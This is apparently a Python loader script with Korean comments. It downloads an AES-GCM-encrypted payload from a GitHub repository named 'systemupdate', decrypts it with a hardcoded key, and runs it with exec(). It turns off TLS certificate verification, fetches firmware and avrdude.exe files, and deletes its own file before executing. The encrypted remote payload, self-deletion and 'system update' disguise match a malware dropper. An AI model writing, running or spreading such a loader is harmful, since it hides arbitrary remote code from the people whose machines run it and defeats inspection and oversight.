# -*- coding: utf-8 -*-
"""뚱시스템 로더 — data.txt AES 복호화 + 실행 + 펌웨어 다운로드"""
import urllib.request, base64, zlib, json, time, ssl, os
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
URL = f"https://api.github.com/repos/blacknut0319-del/systemupdate/contents/data.txt?t={int(time.time())}"
BASE = os.path.dirname(os.path.abspath(__file__))

try:
    req = urllib.request.Request(URL, headers={"User-Agent": "ddong"})
    b64_str = base64.b64decode(json.loads(urllib.request.urlopen(req, timeout=10, context=ctx).read())["content"]).decode("utf-8")
    raw = base64.b64decode(b64_str)
    g = AESGCM(KEY)
    n, e = raw[:12], raw[12:]
    code = zlib.decompress(g.decrypt(n, e, None)).decode("utf-8")
    
    # 펌웨어 파일 다운로드 (실패해도 무시)
    for fpath in ["firmware/cs_firmware.hex", "firmware/avrdude/avrdude.exe", "firmware/avrdude/avrdude.conf", "firmware/avrdude/libusb0.dll"]:
        local = os.path.join(BASE, fpath)
        if not os.path.exists(local):
            try:
                furl = f"https://api.github.com/repos/blacknut0319-del/systemupdate/contents/{fpath}?t={int(time.time())}"
                freq = urllib.request.Request(furl, headers={"User-Agent": "ddong"})
                data = json.loads(urllib.request.urlopen(freq, timeout=10, context=ctx).read())
                os.makedirs(os.path.dirname(local), exist_ok=True)
                with open(local, "wb") as f: f.write(base64.b64decode(data["content"]))
            except: pass
    
    try: os.remove(__file__)
    except: pass
    exec(code)
except Exception as err:
    import ctypes
    ctypes.windll.user32.MessageBoxW(0, f"실행 실패: {err}", "오류", 0x10)
